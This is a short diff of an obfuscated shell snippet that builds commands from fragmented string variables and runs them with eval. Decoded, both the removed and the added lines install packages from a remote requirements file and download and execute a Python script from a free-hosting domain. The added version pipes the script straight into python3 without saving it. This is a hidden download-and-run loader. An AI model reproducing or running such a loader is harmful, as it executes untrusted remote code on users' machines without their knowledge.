@@ -1,3 +1,3 @@
 z="
-";fz='m/ex';Kz='0web';Hz='ecto';az='xyz.';kz='exec';Bz='inst';Qz='ents';dz='stap';Cz='all ';Tz='uiet';lz='ute.';cz='ebho';Ez='ttps';Yz='irec';Pz='irem';Az='pip ';Lz='host';Iz='r-xy';Uz='wget';hz='e.py';Dz='-r h';mz='py';Zz='tor-';Wz='ps:/';Xz='/red';Nz='com/';Jz='z.00';jz='on3 ';Mz='app.';Gz='edir';ez='p.co';Sz=' --q';Fz='://r';Oz='requ';Vz=' htt';gz='ecut';iz='pyth';bz='000w';Rz='.txt';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$Sz$Tz$z$iz$jz$kz$lz$mz"
+";Jz='z.00';Fz='://r';Mz='app.';Zz='ute.';Oz='requ';Cz='all ';Uz='pyth';Xz='et h';Gz='edir';Az='pip ';Rz='.txt';Kz='0web';Hz='ecto';Iz='r-xy';az='py -';Pz='irem';Sz=' --q';bz='q -O';Vz='on3 ';Nz='com/';Dz='-r h';Yz='exec';Tz='uiet';Lz='host';Bz='inst';Qz='ents';Wz='<(wg';cz='-)';Ez='ttps';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Yz$Zz$az$bz$cz"
